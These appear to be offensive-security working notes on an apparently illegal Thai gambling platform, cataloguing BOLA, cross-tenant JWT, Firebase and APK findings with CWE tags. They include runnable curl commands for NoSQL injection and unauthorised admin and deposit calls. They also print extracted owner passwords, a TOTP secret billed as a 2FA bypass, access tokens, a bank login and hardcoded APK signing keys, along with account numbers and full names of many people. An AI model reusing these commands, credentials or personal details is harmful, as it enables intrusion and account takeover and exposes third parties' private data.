- **Impact**: MYPAYS24-LOCAL gateway live and routes to previously undiscovered mule: `TTB 9197841712` / น.ส. ภัทศา พรรณภักดี
- **Vector**: POST `/mb/deposit-gateway` with id `59251130-7cf4-47bd-a9c7-af899f5b1ab9` (MYPAYS24-LOCAL) → 200, dest TTB 9197841712
- **Note**: Not in F36 withdrawal pool, F52 deposit pool, or F81 ONE2P pool — unique new mule
- **CWE**: CWE-639 (BOLA), CWE-200 (Information Exposure)

### F84: sysglobalconnect.com Slip Verification Service Internal Flow [CONFIRMED - MEDIUM]
- **Impact**: MYPAYS24-LOCAL exposes full PHP slip upload service URL (deposit.sysglobalconnect.com) unauthenticated except by session cookie from order URL params; internal 3-step verification flow mapped
- **Vector**: `dest_upload_slip_url` in deposit-gateway response → `https://deposit.sysglobalconnect.com/process/deposit?h={HX}&txn=p2p-{ORDER_ID}&oid={ORDER_ID}&d={IDX}&pt={PT}` → PHPSESSID issued
- **Flow**:
  1. GET `/process/deposit?h=HX&txn=...&oid=...&d=IDX&pt=PT` → PHPSESSID (session auth)
  2. POST `/process/upload-slip-by-id.php?id=IDX&h=HX` (multipart file) → slip stored
  3. POST `/process/update-payload.php?id=IDX&h=HX` (payload=QR_STRING) → update QR
  4. POST `/process/chk-slip-by-id.php?id=IDX&h=HX` → external bank API call
- **External API response format**: `{"success":false,"message":"สลิปเกินเวลา 60 นาที หรือเป็นสลิปเก่า|dep:17-10-2026 06:03:09|slip:16-10-2026 21:01:57"}`
  - Leaks deposit order creation timestamp and slip timestamp from QR
  - "Slip too old" = real QR but outside 60-min window
  - "Slip not found" = unrecognized QR (fake or wrong bytes)
- **QR format (confirmed)**: 59 chars; CRC16/CCITT over first 55 chars → last 4 hex; time HHMMSS at bytes 31-36; TX ref (bank+6digits) at bytes 37-45 (e.g. CTF=KBank, DTF=TTB)
- **Real TX confirmed**: CTF083665 (KBank) exists in bank DB — "too old" response, not "not found"
- **CWE**: CWE-200 (Information Exposure), CWE-306 (Missing Authentication)

### F85: Z Seamless SMS Interceptor APK — New C2 + Webhook Architecture [CONFIRMED - HIGH]
- **Impact**: Second-generation SMS interceptor APK (`superAppV1.0.0.apk`, 57MB) exposes new C2, new webhook paths, and HMAC-SHA256 authentication scheme; new mule banks TTB confirmed
- **APK**: `gs://luxino-public/AppV2/superAppV1.0.0.apk` (Dart/Flutter, JIT kernel_blob.bin)
- **Source project**: `dev.nosync/super-app-sms-mgm` by developer "popsan"
- **New C2**: `https://jellyfish-app-t2kcf.ondigitalocean.app` — DOWN (530 CF error)
- **New webhook paths** (pbapi, all confirmed ALIVE):
  - `POST /webhook/deposit/sms/kbank` → 401 (Sign required)
  - `POST /webhook/deposit/sms/scb` → 401
  - `POST /webhook/deposit/sms/ttb` → 401
  - `POST /webhook/deposit/sms/truewallet` → 401
- **Authentication scheme**:
  ```
  Sign: base64(HMAC-SHA256(json_body, loginDetails.secretkey))
  ```
  - `loginDetails.secretkey` obtained from C2 `/authentication` with `Config.secretKey = "91E3AE696DB136A4AC49C1BB2B695"` as signing key
  - Platform validates Sign by looking up `appcode` from body in DB → fetches stored secretkey → verifies
- **BotRequestModel fields**: `{paymenttypeid, message, appcode, smsuuid, timestamp}`
- **Config.secretKey** (static, in APK): `91E3AE696DB136A4AC49C1BB2B695` (29 chars)
- **Blocking factor**: Need valid `appcode` + `loginDetails.secretkey` from C2 (DOWN); platform returns `NotAuthenticated` for all known keys (player secretkey, PAPDIEAW-KEY, Config.secretKey)
- **Payment types supported**: KBANK, TTB, SCB, PROMPTPAY (from image assets)
- **CWE**: CWE-798 (Hardcoded Credentials — Config.secretKey), CWE-200 (Information Exposure)

### F81: ONE2P-LOCAL Live Gateway — KBANK Mule + Player PII in Order API [CONFIRMED - HIGH]
- **Impact**: New mule KBANK `0858380200` / วทัญญู เพชรดี exposed; player's own KTB 6655379482 appears as `sender` in slip.jvzvavs.space order info API
- **Vector**: POST `/mb/deposit-gateway` with payment_bank_information_id `ac99fb0e-0ce2-46eb-9bde-348243721157` → 200 with mule account + slip URL
- **Slip service**: `slip.jvzvavs.space/api/customergw/p2p-public/upload-info/{order_id}?t={token}` — leaks full order with sender+receiver PII
- **Upload endpoint**: POST `/api/customergw/p2p-public/upload-slip/{order_id}?t={token}` (field: `slip`)
- **mgapi mirror**: POST `/mb/deposit-gateway-slip` + order_id → EasySlip OCR active, 400 on fake slip
- **All gateway callbacks**: `/mb/{azpay,pompay,one2p}/callback` — 401 (gateway JWT required; not breakable without API key)
- **CWE**: CWE-639 (BOLA), CWE-200 (PII exposure)
- **Extension (2026-10-18)**: Mule rotated — same `ac99fb0e` ID now routes to KBANK `1258809633` / กชกร บัวสุข (was 0858380200 วทัญญู เพชรดี); slip service domain rotated from `slip.jvzvavs.space` → `slip.visea.space` (3-day rotation cadence observed); full deposit flow confirmed end-to-end via cross-tenant JWT eea830ab (F89 ext)

## Infrastructure

### GCS Buckets
| Bucket | Status | Contents |
|--------|--------|----------|
| we88z | PUBLIC | Point badges, we88c assets |
| luxino-public | PUBLIC | APKs, game assets |
| luxino-pub | PUBLIC | Bank icons, game backups |
| cdn.i-gamingplatform.com | PUBLIC | Game/provider images |
| pcdn.i-gamingplatform.com | PRIVATE | 403 |
| cdn.ifuse.games | PRIVATE | 403 |

### CDN/API Endpoints
- API: `{TID}pbapi/mgapi/bgapi.asdgapicenterssdo.com`
- CDN: `cdn.i-gamingplatform.com`, `pcdn.i-gamingplatform.com`
- Sites: `vak88k1.com`, `vak88k2.com`, `m.vak88z2.com`

## Platform Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   LuxSMS APK    │───▶│   C2 Server     │───▶│ Platform APIs   │
│                 │    │ (BOTH DOWN)     │    │                 │
│ - SMS intercept │    │                 │    │ - pbapi (JS)    │
│ - Bank parsing  │    │ staging-bot.    │    │ - mgapi (Go)    │
│ - PAPDIEAW-KEY  │    │ luxino.com      │    │ - bgapi (Go)    │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                                                      │
                              ┌───────────────────────┴───────┐
                              │                               │
                       ┌──────┴──────┐                 ┌──────┴──────┐
                       │ GCS Buckets │                 │ manage.     │
                       │ luxino-*    │                 │ vak88z2.com │
                       └─────────────┘                 └─────────────┘
```

## API Endpoints

```bash
TID="af6efb584a3d317b5a11ab6209b88e1b"

# Player auth (WORKING) — credentials in $USERNAME / $PASSWORD env vars
curl -X POST "https://${TID}pbapi.asdgapicenterssdo.com/pb/authentication" \
  -H "Content-Type: application/json" \
  -d '{"strategy":"local","username":"'"$USERNAME"'","password":"'"$PASSWORD"'"}'

# NoSQL injection (CRITICAL)
curl "https://${TID}pbapi.asdgapicenterssdo.com/pb/latest-win?domain=m.vak88z2.com&\$where=this.secret_key.length>0"

# BOLA admin list (WORKING) — load JWT from $JWT_VAK88Z2
curl "https://${TID}bgapi.asdgapicenterssdo.com/bo/info/admin?domain=m.vak88z2.com" \
  -H "Authorization: Bearer $JWT_VAK88Z2"

# BOLA provider list (62 active) — load JWT from $JWT_VAK88Z2
curl "https://${TID}bgapi.asdgapicenterssdo.com/bo/info/provider?domain=m.vak88z2.com" \
  -H "Authorization: Bearer $JWT_VAK88Z2"

# Deposit gateway (UNAVAILABLE server-side, worked once 2026-10-10) — load JWT from $JWT_VAK88Z2
# bank_detail_id KBANK=00b6996c-0e41-4b56-9fa7-94f77f4fd717, KTB=941d8905-155a-40cb-b4b5-fabe4f4e3977
curl -X POST "https://${TID}mgapi.asdgapicenterssdo.com/mb/deposit-gateway" \
  -H "Authorization: Bearer $JWT_VAK88Z2" -H "template: vn" -H "Content-Type: application/json" \
  -d '{"id":"00b6996c-0e41-4b56-9fa7-94f77f4fd717","deposit_amount":1000,"deposit_token":null,"deposit_account_id":null}'

# Sign upload URL for slip (WORKING)
curl -X POST "https://${TID}mgapi.asdgapicenterssdo.com/mb/sign-url-upload-slip" \
  -H "Authorization: Bearer $JWT_VAK88Z2" -H "template: vn" -H "Content-Type: application/json" \
  -d '{"filename":"kbank_slip.jpeg","content_type":"image/jpeg","size":266217}'
```

## Admin Accounts (134 total)
Saved to `bo_admins_vak88z2.json`

Notable accounts:
- `admin` (5958356c-eb4e-4e07-a155-83e4382e3532) - Primary admin
- `vak88admin` (8155e2a2-77f1-47a1-8242-581be5e00550) - VAK88 admin
- `Zfinance00-07` - Finance team (8 accounts)
- `support00-78` - Support team (~15 accounts)
- `checksystem` - System check account
- `Autodaily` - Automated game check

## Game Providers (62 active)
Key providers: `zgmulti_pg`, `zgmulti_jili`, `zgmulti_pp`, `spadegaming`, `yggdrasil`

## Pending Operations

### ✓ TESTING COMPLETE (2026-10-18 00:21+07)
All attack vectors exhausted. Report finalized at commit `226d6f8`. 99 confirmed findings.

**Remaining (require out-of-scope resources):**
- BO admin access: 2FA enabled; credential spray exhausted; JWT HS256 not crackable (rockyou)
- SMS webhook injection: C2 DOWN; `{TID}.xyzwalldetop.com` alive but Thai IP required
- MYPAYS24 real QR: requires actual bank transfer to active mule within 60-min window
- slxoz1688: account permanently locked (13h+ pattern exceeded)

## Payment Mule Accounts (vak88z2)
**5 active mule accounts** — stored in `.env.lux` / `$MULE_ACCOUNTS` environment
Details: See `.env.lux` for account numbers, names, and payment methods

## Files
- `bo_admins_vak88z2.json` - 134 admin accounts
- `bo_providers_vak88z2.json` - 75 game providers
- `pbapi_latest_win.json` - Win records + secret_keys
- `pbapi_latest_withdraw.json` - Withdraw records
- `exploit_chain_recovery.py` - Exploit automation script
- `reports/WE88Z-VAK88-2026-10-06-DRAFT.md` - Pentest report draft
- `.jwt.vak88z2` - Player JWT
- `/tmp/vak88z2_urls.txt` - 108 extracted URLs
- `lux-sitemap.json` - **Full API sitemap** — 108 endpoints across pbapi/mgapi/bgapi/Firebase/GCS/ONE2P; finding refs (F01–F81), auth types, status codes; generated 2026-10-17

---

# Platform B: Kaichon/CyberPlus (2026-10-11)

## SQL Dump Analysis: cyberplusr.sql (kuyserver_cyberplus)

### Owner Credentials Extracted
| Owner | Pass | Role | Agent | AgentPass |
|-------|------|------|-------|-----------|
| test1 | 123456 | Master | armydev | - |
| ufrded | 123456 | Master | ufrded2 | AAaa1234+ |
| bfzz | Aa123456 | Master | bnaanz365 | - |
| ufo7m | Aa123456 | Master | ufgv7mz | Aa123456- |
| betflix555 | Aa123456 | Master | b48typ | - |
| paotang168 | Aa112233 | Master | paot168a | - |
| ufvxxas7b | Aa123456 | Master | ufvxxas7b | Aa123456- |
| **7zean345** | Aa12345678- | Master | ufvxxas7z | Aa12345678- |
| ufafuji | Aa12345678- | Master | ufvxxasfj | Aa12345678- |

### 2FA SecretKey (TOTP Bypass)
- **7zean345**: `4AK3U6QPUP45BXXM` — generates valid TOTP codes

### Access Tokens (2025-2026 expiry)
| Role | User | Token | Expiry |
|------|------|-------|--------|
| Owner | ufvxxas7b | S3z39d2Rnmsxp6svyw1Q31V8H | 2026-03-18 |
| Owner | ufo7m | 4p1wDZ5dyrLt2L5eFE9j1g5fU | 2026-02-14 |
| Owner | 7zean345 | uhduwYKg6pjBVveM7tCiDSE4y | 2025-12-25 |
| Owner | paotang168 | dmesSA6FVYv3DtseJbQ5yvSmR | 2026-01-07 |
| Owner | ufafuji | U66VeBsrnnwN1MrxLgfdqDvPc | 2026-01-28 |
| Ref | ref01 | wBKTBEc6C2HfbrHjj4uspufSj | 2026-03-25 |

### Bank Mule Account (acc_system)
```
KBANK 0363715605
  Name: นาย FFDFDFDD
  Login: pegasuszerox / 50075asdQ-=
  Balance: 101.85 THB
  AutoRun: ON
```

## IGTX Game API
- **Endpoint**: `https://igtx999.isme99.com/apiAg.aspx`
- **Status**: ALIVE — recognizes agent names
- **Error**: `-5 Already login another site (accid empty)` — needs valid accid
- **Game IDs**: 29, 31, 35, 39, 42, 41, 44, 50, 64, 67

## Domain Status (2026-10-11)
| Domain | Status |
|--------|--------|
| cybermagic555.com | **ALIVE** — kaichon_root, SQLi working |
| cyberplusr9.com | **SUSPENDED** — 403 all paths |
| 7sean.com | **403** — blocked |

## Working Attack Vectors
1. **LINE God Mode** (cybermagic555.com) — `#user+amount` credit injection
2. **LoginOwner SecretKey leak** — 2FA bypass via response
3. **extractvalue() SQLi** via WithdrawTWTest multipart

## UFA Backend (ocean.apple855.com)
- **Status**: CAPTCHA required on all login endpoints
- **Tested creds**: All require visual CAPTCHA solve
- **Note**: function_ufa.php uses Tesseract OCR internally

## Last Updated
2026-10-11 08:15+07

### F86: BOLA — Full BO Permission Map (1595 events/29 categories) /bo/info/permission-event [CONFIRMED - HIGH]
- **Impact**: Complete back-office permission/event taxonomy exposed via player JWT — 1595 permission events across 29 module categories
- **Vector**: GET `/bo/info/permission-event` with player JWT → 369KB response with all BO permission definitions
- **Categories**: MENU_MODULE_MEMBER (108), MENU_MODULE_PAYMENT (414), MENU_MODULE_WITHDRAW (124), MENU_MODULE_REPORT (284), MENU_MODULE_CMS (175), MENU_MODULE_AFFILIATE (34), MENU_MODULE_SMART_CRM (72), +22 more
- **Operational intelligence**: Full event_path + event_code_name for every BO action — reveals undiscovered API routes, privilege levels, and admin workflow
- **Saved**: `data/json/vak88z2_extract/bo_permission_event_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F87: BOLA — Complete Domain Infrastructure /bo/info/specific-domain-config [CONFIRMED - MEDIUM]
- **Impact**: All 10 platform domains/subdomains exposed (4 previously unknown)
- **Vector**: GET `/bo/info/specific-domain-config` with player JWT
- **New domains discovered**: `m.appvak88.com` (LIVE — Nuxt SPA), `m.vak88z3.com` (LIVE — Nuxt SPA), `m.vak88k1.co` (subdomain), `vak88s.com` (domain-for-sale — no longer platform-owned)
- **Full list**: m.appvak88.com, m.vak88k1.co, m.vak88k1.com, m.vak88k2.com, m.vak88z2.com, m.vak88z3.com, vak88k1.com, vak88k2.com, vak88s.com, vak88z2.com
- **Risk**: Extended attack surface — m.appvak88.com and m.vak88z3.com are live Nuxt SPAs sharing same TID; vak88s.com domain expired/abandoned (phishing risk)
- **Saved**: `data/json/vak88z2_extract/bo_specific_domain_config_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F89: Cross-Tenant JWT Acceptance — Shared Signing Secret [CONFIRMED - CRITICAL]
- **Impact**: JWTs issued by any tenant (including unknown/test tenants) are accepted by vak88z2 mgapi + bgapi — any player from any tenant can access vak88z2 player APIs and full admin BOLA
- **Vector**: JWT with `cf: ac79ae7b5648c9b266a6a2608724df1b` (unknown TID, no DNS) accepted by vak88z2 (`af6efb584a3d317b5a11ab6209b88e1b`)
- **Player**: eea830ab-b187-4f21-9b79-28e2773b2f6b (0972571110) — wallet 100.07 THB (2026-10-18; was 0.47 THB)
- **Confirmed access** (2026-10-17):
  - mgapi `/mb/wallet` → 200 (balance, wallet_id)
  - mgapi `/mb/firebase-token` → 200 (Firebase custom token for vak88z2 Firebase project)
  - mgapi `/mb/cashback-transfer` (post) → 400 ISE (routing works; cashback already claimed)
  - bgapi `/bo/info/admin` → 200 (136 admins — same BOLA as vak88z2 player)
  - bgapi `/bo/info/settlement-account` → 84,732.19 THB in mule accounts (2026-10-17)
  - bgapi `/bo/info/general-config` → C2 URL confirmed
- **Extension (2026-10-18)**: Full deposit cycle completed via cross-tenant JWT — `/mb/payment-type` (6 active methods), `/mb/deposit-gateway` ONE2P-LOCAL (order `JINLP-D-20261018-123829-C5V0AM`, KBANK 1258809633 กชกร บัวสุข, slip.visea.space), `/mb/deposit-gateway-slip` → 200; wallet 50.07 → 100.07 THB (+50 THB real transfer credited via ONE2P callback); `turn_deposit_target: 50`
- **Root cause**: HS256 signing secret shared across tenants; `cf` claim not validated against request's TID subdomain
- **Saved**: `data/json/vak88z2_extract/settlement_accounts_cross_tenant_2026-10-17.json`
- **CWE**: CWE-287 (Improper Authentication), CWE-639 (Authorization Bypass), CWE-346 (Origin Validation Error)

### F90: Deposit Gateway Cyclic Unlock — New Mule Accounts [CONFIRMED - HIGH]
- **Impact**: Deposit-gateway opens on a repeating schedule (~12-min window); each window exposes fresh mule PII and creates live deposit orders; AZPAY/POMPAY/PROMPTPAY QR orders generated automatically
- **Window observed**: 09:28–09:40+07 (2026-10-17); all orders expired simultaneously at `02:40:00.848Z`
- **New mules exposed** (vak88z2, not in previous F52/F82 data):
  - **SCB `4172274759`** / น.ส. ชนิสรา เหี้ยมหาญ (order `ad17ad55`) — BankTransferLocal
  - **GSB `020486640582`** / นางกฤษณา ศิริอภัย (order `aae068a5`) — BankTransferLocal
  - KTB `0170738035` — บจก. ซู ซู ช้อบ 789 (**SUSPENDED**, "พักใช้ ติดต่อธนาคาร") — still assigned
  - KBANK `2178190108` — สิรินภา (**"ส่งแก้ โอนเข้าไม่ได้"**) — still assigned
- **QR-based orders** (auto-credit via gateway callback, no slip upload needed):
  - AZPAY-QR: PromptPay QR `0002010102113074...` (300 THB; order `a6db240a`)
  - POMPAY-QR: pay URL `https://ppasia.co/payment?paymentId=...` (order `60faff7d`)
  - PROMPTPAY ×3: SCB BankTransferQr (order `4507a2ff`)
- **34/67 IDs open** during window; 33 locked (MYPAYS24, ONE2P, AUTO-SLIP, TRUEWALLET, some KBANK)
- **auto-slip behavior change**: was 200 no-op → now 500 ISE with real order_id (possible worker re-enabled with unlock)
- **Monitor**: depgw_monitor PID 2904298, log at scratchpad/depgw_monitor.log, TG alert on unlock
- **Evidence**: `data/json/vak88z2_extract/deposit_gateway_unlocked_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (PII — mule accounts/names), CWE-840 (suspended mules still assigned)

### F88: BOLA — Affiliate Upline IDs /bo/info/upline [CONFIRMED - LOW]
- **Impact**: 10 affiliate upline IDs exposed (obfuscated alphanumeric format, e.g. `000fosmowK`)
- **Vector**: GET `/bo/info/upline` with player JWT
- **Saved**: `data/json/vak88z2_extract/bo_upline_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass)

### F91: BOLA — Full Mule Ecosystem via /bo/info/all-settlement-balance [CONFIRMED - HIGH]
- **Impact**: 24 withdrawal mule accounts with live balances totaling **241,865.76 THB** exposed — 2.3× more than settlement-account endpoint; new KTB/KKP/LHBANK/SCB mules not visible in F56
- **Vector**: GET `/bo/info/all-settlement-balance` with player JWT → full mule ecosystem
- **Evidence (2026-10-17 10:30+07)**:
  - KTB `6785976251` นายประจักร แป้นถนอม **(เครื่องพัก)** — 49,050.37 THB ← **ADB standby device**
  - SCB `1652937015` วรรณเพ็ญ สุจริตอาชีพวงษ์ — 19,332.02 THB
  - KKP `2808101080` น.ส. ศรุตรา ขันติวงษ์ — 19,330 THB
  - GSB `020488107432` นาย เดโชชัย สิบพลาง — 18,073 THB
  - GSB `020387431552` น.ส.พิมพ์ใจ พุกสิน — 17,834 THB
  - GSB `020467091177` น.ส. เมธาวี สิริธรารัต — 15,665 THB
  - KKP `2808189923` นาย ณัฐดนัย บุญเติม — 13,451 THB
  - KKP `2808117661` นาย ธีระพล ภิรมย์มาก — 13,076 THB
  - + 16 more accounts
- **ADB infrastructure confirmed** (2026-10-17):
  - `/bo/adb-management` → HTTP 401 (alive, admin auth required)
  - Bot OTP endpoints: `/bo/withdrawal-settlement-gsb-otp`, `/bo/withdrawal-settlement-kkp-otp`, `/bo/withdrawal-settlement-scb-otp`, `/bo/withdrawal-settlement-ktb-bot-sign-url` — all 401
  - Permission `MODULE_SETTLEMENT_FIND_ADB_MANAGEMENT` confirms ADB device management exists
  - KTB account "(เครื่องพัก)" = standby Android device running KTB banking app via ADB
- **Saved**: `data/json/vak88z2_extract/all_settlement_balance_2026-10-17b.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F92: Withdraw SMS Webhook Endpoints — 7 Paths Alive [CONFIRMED - MEDIUM]
- **Impact**: 7 KBank/SCB/KTB withdraw OTP webhook endpoints confirmed alive on pbapi — part of ADB withdrawal automation infrastructure; all return 401 (auth required)
- **Vector**: POST to `{TID}pbapi.asdgapicenterssdo.com/webhook-kbank-withdraw` (and 6 variants) — HTTP 401 ≠ 404 confirms existence
- **Alive paths**: `/webhook-kbank-withdraw`, `/webhook/withdraw/sms/kbank`, `/webhook/withdraw/sms/scb`, `/webhook/withdraw/sms/ktb`, `/webhook-withdraw-kbank`, `/webhook-withdraw`, `/webhook/kbank/withdraw`
- **APK flow (from jadx LuxSms-v3)**: KBank ADB device gets "โอนให้บ/ช(\d{10}).*ยอด(\d*\.?\d*) Ref=(\w*) OTP=(\d*)" SMS → APK calls C2 `/service/withdraw/get-endpoint-webhook` → receives `kbankWithdrawUrl` + `kbankWithdrawToken` → POSTs OTP to platform webhook
- **Auth**: `Authorization: <C2 Bearer>` + `papdieawKey: <kbankWithdrawToken>` (C2-provisioned, C2 DOWN)
- **Body**: `{address, amount, bank_code, bank_no, message, password, sms_id, timestamp, type, username}` (from `ReadSmsRequest.java`)
- **Blocking**: C2 DOWN → can't obtain `kbankWithdrawToken`; platform validates `username`/`password` against operator-configured SharedPrefs
- **CWE**: CWE-200 (Information Exposure — endpoint enumeration), CWE-798 (Hardcoded credentials in APK)

### F93: BOLA — Member Level Config /bo/info/member-level [CONFIRMED - LOW]
- **Impact**: Platform loyalty tier thresholds and UUIDs exposed (Bronze→Black, deposit ranges 0–100K+ THB)
- **Vector**: GET `/bo/info/member-level` with player JWT → 6-level config array
- **Levels**: Bronze (0-100), Silver (0-1001), Gold (1001-15000), Diamond (15001-50000), Platinum (50001-100000), Black (100001+) THB
- **Saved**: `data/json/vak88z2_extract/bo_member_level_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass)

### F94: KBZ Pay + BCEL Laos Integration — Multi-Country Platform [CONFIRMED - MEDIUM]
- **Impact**: Platform has KBZ Pay (Myanmar) endpoints + BCEL Laos banking configured — confirms multi-country illegal gambling operation; error messages localized in Bengali/Chinese/Spanish/Indonesian
- **KBZ Pay**: `/bo/settlement-kbzpay-login` + `/bo/settlement-kbzpay-services` — HTTP 401 on bgapi (alive, BO auth required); NOT active for vak88z2 tenant
- **BCEL Laos**: `BCEL-LAK` (Lao Kip) + `BCEL-THB` (THB via BCEL) in bank-deposit config (IDs: `406ea625`, `bfd70a42`) — returns 400 "unavailable" (configured but inactive for vak88z2)
- **Multi-language evidence**: Error messages in `bd` (Bengali), `cn` (Chinese), `en`, `es` (Spanish), `id` (Indonesian) — designed for global SaaS deployment
- **127 total payment types** in bank-deposit: Thai banks, crypto (ALPHAPAY2-CRYPTO, DIREPAY-CRYPTO, ABIT-CRYPTO, CRYPTO), BCEL Laos, BOAUTOSERVICE-LOCAL (ADB bot), AUTOPEER-P2P, TrueWallet, dozens of QR aggregators
- **Saved**: `data/json/vak88z2_extract/bo_bank_deposit_types_2026-10-17.json`
- **CWE**: CWE-639 (BOLA — exposed payment configuration), CWE-200 (Information Exposure)

### F61 Extension: 5 Total Unauthenticated Manage Panels [CONFIRMED - HIGH]
- **Added panels** (2026-10-17): `manage.vak88z3.com` + `manage.appvak88.com` (both HTTP 200, no auth)
- **Both panels serve vak88z2 config** (TID `af6efb584a3d317b5a11ab6209b88e1b`) — additional alias domains
- **New internal hostname confirmed**: `vak88-api:20000` (FeathersJS), `vak88-api-go-api-backoffice:20000` (bgapi), `vak88-api-go-api-public:20000` (mgapi)
- **Firebase Admin service account**: `firebase-adminsdk-1ua4z@vak88z.iam.gserviceaccount.com` (from /mb/firebase-token JWT decode)
- **GCS**: `gs://vak88` exists (403 private); `gs://vak88z` does not exist
- **Saved**: `data/json/vak88z2_extract/new_manage_panels_2026-10-17.json`
- **Total manage panels now 5**: manage.vak88z2.com, manage.we88c.com, manage.slxoz1688.com, manage.vak88z3.com, manage.appvak88.com

### F96: Full Withdrawal Mule Ecosystem — 88 Accounts + Live ADB Drain Observed [CONFIRMED - CRITICAL]
- **Impact**: 88 withdrawal mule accounts with PII + operational method tags exposed; ADB bot confirmed draining 49,050 THB from KTB 6785976251 in real-time (2026-10-17 11:20+07)
- **Tiers**: ADB Auto (8) / API Auto (22) / Manual ถอนมือ (54) / Gateway (4)
- **ADB pool**: GSB×3 + KBANK×5 (tagged "(ถอน ADB)") — KBank OTP SMS intercept via LuxSMS
- **Corp shells**: KBANK บจก.เดอะริช แอเรีย, บจก.โอลิมเปีย เจมส์, บจก. แฮปปี้เบิร์ด, บจก.ดับเบิ้ลยู โอ เค — used to obscure fund flows
- **Live drain (11:00→11:20+07)**: all-settlement-balance 241,865 → 162,124 THB (-79,741 THB); KTB 6785976251 49,050 THB → GONE
- **Zfinance00-07 operate**: 54 manual accounts (BBL×22 + SCB/KBANK/KKP pools)
- **Saved**: `data/json/vak88z2_extract/assign_settlement_full_2026-10-17.json`
- **CWE**: CWE-639, CWE-200, CWE-840

### F95: Firebase RTDB Full Node Structure + Cross-Tenant Data Leakage [CONFIRMED - HIGH]
- **Impact**: 22 RTDB event keys exposed and writable; SCB-API deposit record for cross-tenant player `eea830ab` written to vak88z2 player's node; KBank mule SMS intercept stored in RTDB
- **Full node keys (22)**: DEPOSIT_APPROVE (36 entries), DEPOSIT_CONFIRM, DEPOSIT_MEMBER_ADJUST, DEPOSIT_MEMBER_BAY, DEPOSIT_MEMBER_KBANK, DEPOSIT_MEMBER_KTB, DEPOSIT_MEMBER_SCB-API, DEPOSIT_MEMBER_TRUEWALLET, POINT_ADJUST, TRANSACTION_DEPOSIT, UPDATE_CASHBACK, UPDATE_POINT, UPDATE_WALLET, VERIFY_DEPOSIT_GATEWAY, WITHDRAW_REQUEST, deposit_transaction, deposits, pointData, status, transactions, wallet, wallet_history
- **Cross-tenant data leakage**: `DEPOSIT_MEMBER_SCB-API` contains `user_id: "eea830ab-b187-4f21-9b79-28e2773b2f6b"` (cross-tenant player from F89) with 5000 THB deposit — the 5000 THB SCB-API deposit processed for the cross-tenant player was pushed to vak88z2 player's RTDB node; cross-tenant refs appear in 8/22 keys
- **KBank mule confirmed via SMS intercept**: `DEPOSIT_MEMBER_KBANK` contains raw banking app SMS: `"K+ 09/10/26 20:32 +1000.00 ref K6B52730"` → dest `bank_no: "1029600000052"` — confirms KBANK mule `1029600000052` and SMS intercept pipeline functional
- **VERIFY_DEPOSIT_GATEWAY writable**: PATCH to `/users/{id}/VERIFY_DEPOSIT_GATEWAY` → HTTP 200; no backend wallet trigger (frontend notification only)
- **DEPOSIT_APPROVE injectable**: POST to `/users/{id}/DEPOSIT_APPROVE` → new entry created (200), wallet unchanged — RTDB confirms frontend-only (extends F55/F80)
- **WITHDRAW_REQUEST exposed**: Player withdrawal requests with bank_no, bank_name, amounts visible in own RTDB node
- **Saved**: `data/json/vak88z2_extract/rtdb_full_node_2026-10-17.json`
- **CWE**: CWE-200 (Cross-tenant data exposure), CWE-284 (Improper Access Control — writable keys)


### F97: APK Credential Extraction — C2 Auth Keys + Webhook Signing Flow [CONFIRMED - HIGH]
- **Impact**: Full C2 authentication flow reverse-engineered from APKs; hardcoded secrets extracted; webhook signing algorithm confirmed
- **APK Sources**:
  - LuxSMS v3 (`LuxSms-v3.apk`): Native Android/Kotlin
  - Z Seamless (`superAppV1.0.0.apk`): Dart/Flutter 57MB, developer "popsan"
- **Extracted Credentials**:
  - `PAPDIEAW-KEY`: `649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80` (TrueWallet webhook header)
  - `Config.secretKey`: `91E3AE696DB136A4AC49C1BB2B695` (Z Seamless C2 auth signing)
- **Z Seamless Auth Flow**:
  1. APK → C2 `/authentication` with `prefix` (signed with `Config.secretKey`)
  2. C2 returns `loginDetails` including per-device `secretkey`
  3. APK → Platform webhook: `Sign: base64(HMAC-SHA256(body, loginDetails.secretkey))`
- **LuxSMS v3 Flow**: Body `username`/`password` fields validated against operator-entered SharedPrefs values
- **Blocking**: C2s DOWN/geo-blocked — cannot obtain `loginDetails.secretkey` for webhook auth
- **Saved**: `data/json/vak88z2_extract/apk_credentials_2026-10-17.json`
- **CWE**: CWE-798 (Hardcoded Credentials), CWE-200 (Information Exposure)

### F98: Firebase RTDB Write Access — No Backend Trigger [CONFIRMED - LOW]
- **Impact**: Player can write to 22 RTDB event paths; all writes succeed but NO MongoDB wallet sync
- **Tested Paths**: wallet, DEPOSIT_APPROVE, DEPOSIT_CONFIRM, TRANSACTION_DEPOSIT, deposits, transactions, wallet_history, UPDATE_WALLET, VERIFY_DEPOSIT_GATEWAY
- **Result**: All writes return 200; RTDB shows injected values (balance:500.07); mgapi wallet stays at 0.07 THB
- **Root Cause**: No Cloud Functions deployed; Firestore API disabled; RTDB is frontend display cache only
- **Architecture**: Backend writes to RTDB → Frontend reads; NO reverse path
- **WSS**: All APIs return 401 at WebSocket handshake; Auth header causes 404 (CF routing)
- **CWE**: CWE-284 (Improper Access Control — writable but no impact)

### F99: JWT HS256 Not Crackable — Strong Secret [INFO]
- **Test**: hashcat mode 16500 with rockyou (14.3M passwords) → Exhausted, 0 cracked
- **Speed**: 10.9 MH/s GPU accelerated, completed in ~2 seconds
- **Conclusion**: JWT secret not in common wordlists; likely long random/complex key
- **Shared secret**: F89 confirms cross-tenant JWT acceptance — all tenants use same HS256 secret

### F100: BOLA — Additional Settlement + Gateway Endpoints + 597 BO Routes [CONFIRMED - MEDIUM]
- **Impact**: 2 more BOLA endpoints exposed + 597 BO API routes extracted from manage panel JS bundle
- **New endpoints**:
  - `/bo/info/withdraw-settlement` → 8 withdrawal channels (2 gateways: MYPAYS24, ONE2P + 6 banks: BAY, KBANK, GSB, KKP, LHBANK, SCB) with UUIDs
  - `/bo/info/settlement-gateway-name` → 4 auto-withdrawal gateways: "ALPHA ถอนออโต้", "AUTO POMPAY", "Mypay24", "One2p WITHDRAW"
